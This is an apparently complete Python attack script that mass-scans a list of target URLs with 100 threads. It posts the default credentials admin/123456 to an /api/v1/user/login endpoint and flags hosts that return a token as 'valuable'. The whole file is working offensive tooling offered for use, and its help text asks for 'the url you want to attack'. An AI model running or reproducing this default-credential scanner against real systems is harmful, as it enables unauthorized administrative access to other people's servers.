import requests,argparse,re,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    perser = argparse.ArgumentParser(description="这是脚本的提示信息")
    perser.add_argument('-u','--url',help="Please input the url you want to attack")
    perser.add_argument('-f','--file',help="Please input the file you want to attack")
    args = perser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def banner():
    test = """
 ██░ ██ ▓█████  ██▓ ▄████▄   ██░ ██  ▄▄▄       ▒█████  
▓██░ ██▒▓█   ▀ ▓██▒▒██▀ ▀█  ▓██░ ██▒▒████▄    ▒██▒  ██▒
▒██▀▀██░▒███   ▒██▒▒▓█    ▄ ▒██▀▀██░▒██  ▀█▄  ▒██░  ██▒
░▓█ ░██ ▒▓█  ▄ ░██░▒▓▓▄ ▄██▒░▓█ ░██ ░██▄▄▄▄██ ▒██   ██░
░▓█▒░██▓░▒████▒░██░▒ ▓███▀ ░░▓█▒░██▓ ▓█   ▓██▒░ ████▓▒░
 ▒ ░░▒░▒░░ ▒░ ░░▓  ░ ░▒ ▒  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░▒░▒░ 
 ▒ ░▒░ ░ ░ ░  ░ ▒ ░  ░  ▒    ▒ ░▒░ ░  ▒   ▒▒ ░  ░ ▒ ▒░ 
 ░  ░░ ░   ░    ▒ ░░         ░  ░░ ░  ░   ▒   ░ ░ ░ ▒  
 ░  ░  ░   ░  ░ ░  ░ ░       ░  ░  ░      ░  ░    ░ ░  
                   ░                                   
                                        author:heichao
                                        version:1.0.1
"""
    print(test)
def poc(target):
    """漏洞检测"""
    url = target + "/api/v1/user/login"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Content-Type":"application/json;charset=UTF-8"
    }
    data = {
        "username":"admin",
        "password":"123456"
    }
    try:
        response = requests.post(url=url,headers=headers,json=data,verify=False,timeout=5).text
        if "token" in response:
            print(f"[+]{target} is valuable,[admin,123456]")
        else:
            print(f"[-]{target} is not vulable")
    except:
        print(f"[*]{target} sever error")

if __name__ == '__main__':
    main()